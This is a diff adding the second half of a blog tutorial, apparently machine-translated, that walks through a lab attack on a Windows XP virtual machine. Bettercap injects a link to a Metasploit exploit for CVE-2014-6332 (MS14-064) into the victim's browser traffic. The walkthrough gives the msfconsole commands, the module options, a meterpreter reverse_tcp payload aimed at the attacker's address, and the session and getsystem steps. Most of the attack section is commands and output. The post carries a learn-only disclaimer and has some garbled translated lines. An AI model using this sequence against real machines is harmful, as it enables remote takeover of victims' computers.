@@ -163,4 +163,159 @@ Since IE8 no longer supports HTTPS for Bing, it will be vulnerable as soon as it
 
 ![](/img/2021-02-02_15-25.png)
 
+And then there's so much we can do.
+
+![](/img/2021-02-02_15-27.png)
+
+I decided to use a clippy module that binds to a `ms14-064` address, and now it's msf's turn.
+
+```bash
+$ msfconsole
+```
+
+![](/img/2021-02-02_15-31.png)
+
+Enable Modules.
+
+```txt
+> use exploit/windows/browser/ms14_064_ole_code_execution
+```
+```txt
+> info 
+```
+Let's see the description.
+
+>Description:
+>
+>  This module exploits the Windows OLE Automation array vulnerability, 
+>  CVE-2014-6332. The vulnerability is known to affect Internet 
+>  Explorer 3.0 until version 11 within Windows 95 up to Windows 10, 
+>  and no patch for Windows XP. However, this exploit will only target 
+>  Windows XP and Windows 7 box due to the Powershell limitation. 
+>  Windows XP by defaults supports VBS, therefore it is used as the 
+>  attack vector. On other newer Windows systems, the exploit will try 
+>  using Powershell instead.
+
+
+Check the options
+
+```txt
+show options
+```
+
+```txt
+Module options (exploit/windows/browser/ms14_064_ole_code_execution):
+
+   Name                   Current Setting  Required  Description
+   ----                   ---------------  --------  -----------
+   AllowPowershellPrompt  false            yes       Allow exploit to try Powershell
+   Retries                true             no        Allow the browser to retry the module
+   SRVHOST                0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT                8080             yes       The local port to listen on.
+   SSL                    false            no        Negotiate SSL for incoming connections
+   SSLCert                                 no        Path to a custom SSL certificate (default is randomly generated)
+   TRYUAC                 false            yes       Ask victim to start as Administrator
+   URIPATH                                 no        The URI to use for this exploit (default is random)
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.101.15   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Windows XP
+```
+Normally we would just set a `SRVHOST`, but `bettercap` just took port `8080`, so we need to set a new `SRVPORT`.
+
+The `SRVHOST` is set to the address of the attacking machine.
+
+```txt
+set SRVHOST 192.168.101.15
+```
+
+`SRVPORT` Arbitrarily specify a free port
+
+```txt
+set SRVPORT 9999
+```
+
+Execute.
+
+```txt
+exploit
+```
+
+Then we get it
+
+```txt
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 192.168.101.15:4444 
+[*] Using URL: http://192.168.101.15:9999/deCFhCIwXNHYT
+[*] Server started.
+```
+
+Change the default `Clippy image directory` address to the attacker's address, then put the link `http://192.168.101.15:9999/deCFhCIwXNHYT` in the `Executable` field.
+
+![](/img/2021-02-02_15-52.png)
+
+Then click the `execute`.
+
+That's when a funny thing happens to the target machine.
+
+![](/img/VirtualBox_XP_02_02_2021_15_53_43.png)
+
+Whichever one you click on, it jumps to the msf link.
+After clicking on it, msf responds.
+
+![](/img/2021-02-02_15-55.png)
+
+A `meterpreter` connection is established.
+
+![](/img/2021-02-02_15-57.png)
+
+Get in the session.
+
+```txt
+sessions -i 1
+```
+![](/img/2021-02-02_15-59.png)
+
+At this point we can use `meterpreter` to operate the target machine as normal...
+
+![](/img/2021-02-02_16-00.png)
+
+The `getsystem` lifting is also no problem.
+
+As for the use of `meterpreter`, I will not continue to write about it, because I have written about it before (escape.).
+
+Then here is half of the success, the rest is the post-penetration, say a long time can not finish it ~ ~ here it is ~
+
+## End
+I'm sorry, but I'm not sure if I'm going to be able to do this. qwq
+However, to declare that the content of this article is limited to the test to learn to use, **do not take to do bad things**, or the consequences of their own Oh ~
+
+Finally, this site follows the [CC-BY-NC 4.0 protocol] (https://creativecommons.org/licenses/by-nc/4.0/), reproduced please specify the source!
+
+## Reference links
+
+* [CVE-2014-6332 : OleAut32.dll in OLE in Microsoft Windows Server 2003 SP2, Windows Vista SP2, Windows Server 2008 SP2 and R2 SP1, Windows](https://cvedetails.com/cve/CVE-2014-6332/)
+* [Microsoft Security Bulletin MS14-064 - Critical | Microsoft Docs](https://docs.microsoft.com/en-us/security-updates/SecurityBulletins/2014/MS14-064)
+* [Microsoft Internet Explorer 11 - OLE Automation Array Remote Code Execution (1) - Windows remote Exploit](https://www.exploit-db.com/exploits/35229)
+* [Microsoft Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / PowerShell VirtualAlloc (MS14-064) - Windows remote Exploit](https://www.exploit-db.com/exploits/35308)
+* [IBM X-Force Researcher Finds Significant Vulnerability in Microsoft Windows](http://securityintelligence.com/ibm-x-force-researcher-finds-significant-vulnerability-in-microsoft-windows)
+* [CVE-2014-6332: it&#8217;s raining shells | forsec](https://forsec.nl/2014/11/cve-2014-6332-internet-explorer-msf-module)
+* [kali bettercap的使用 | UsstZt](https://usstzt.site/2020/05/26/bettercap%E7%9A%84%E4%BD%BF%E7%94%A8/#&gid=1&pid=2)
+* [Bettercap2.6与beef的使用_请你吃橘子-CSDN博客](https://blog.csdn.net/qq_33066259/article/details/80737308)
+* [DeepL Translate](https://www.deepl.com/translator#en/zh/This%20module%20exploits%20the%20Windows%20OLE%20Automation%20array%20vulnerability%2C%20CVE-2014-6332.%20The%20vulnerability%20is%20known%20to%20affect%20Internet%20Explorer%203.0%20until%20version%2011%20within%20Windows%2095%20up%20to%20Windows%2010%2C%20and%20no%20patch%20for%20Windows%20XP.%20However%2C%20this%20exploit%20will%20only%20target%20Windows%20XP%20and%20Windows%207%20box%20due%20to%20the%20Powershell%20limitation.%20Windows%20XP%20by%20defaults%20supports%20VBS%2C%20therefore%20it%20is%20used%20as%20the%20attack%20vector.%20On%20other%20newer%20Windows%20systems%2C%20the%20exploit%20will%20try%20using%20Powershell%20instead.)
+
 
